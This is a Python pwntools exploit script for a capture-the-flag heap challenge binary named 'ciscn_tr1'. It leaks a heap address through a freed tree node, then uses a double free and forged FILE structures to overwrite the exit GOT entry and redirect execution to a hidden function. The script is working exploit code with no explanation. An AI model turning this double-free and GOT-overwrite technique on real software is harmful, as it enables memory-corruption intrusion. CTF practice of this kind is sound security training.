from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./ciscn_tr1")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./ciscn_tr1")
else:
	pass

def menu(choice):
	p.sendlineafter("Choice> ",str(choice))

def add(nodes):
	menu(1)
	p.sendlineafter("Number of nodes?\n",str(len(nodes)))
	for i in range(len(nodes)):
		p.sendafter("node\n",str(nodes[i]))

def show(index):
	menu(3)
	p.sendlineafter("Which tree?\n",str(index))
	p.sendlineafter("choice> ","1")

def free(index):
	menu(2)
	p.sendlineafter("Which tree to cut?\n",str(index))

def exit_():
	menu(4)

def debugf():
	if debug:
		gdb.attach(p,"b *0x400C98")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
add(["a"])
add(["b"])
add(["c"])
free(3)
free(2)
#debugf()
show(2)
leak_addr = u64(p.recvuntil(" \n",drop = True).ljust(8,"\x00"))
heap_base = leak_addr - 0x110
log.success("heap_base:" + hex(heap_base))
#debugf()
secret = 0x00000000004008E6
payload = p64(secret)
li = []
for i in range(7):
	if i == 3:
		li.append(p64(0) + p64(0xfbad8000) + payload)
	elif i == 6:
		li.append(p64(0) + p64(0) + p64(0xfbad8000) + payload + p64(heap_base + 0x240))
	else:
		li.append(p64(0) * 2 + payload)
add(li)
file_ = heap_base + 0x1a8
#free(2)
free(3)
free(2)
free(3)
free(1)
#debugf()
target = elf.got["exit"] + 2 - 8
payload = p64(target)
payload2 = "\x00" * 6 + p64(0) + p64(file_)
#debugf()
add(["junk",payload,"1","2",payload2])
p.interactive()
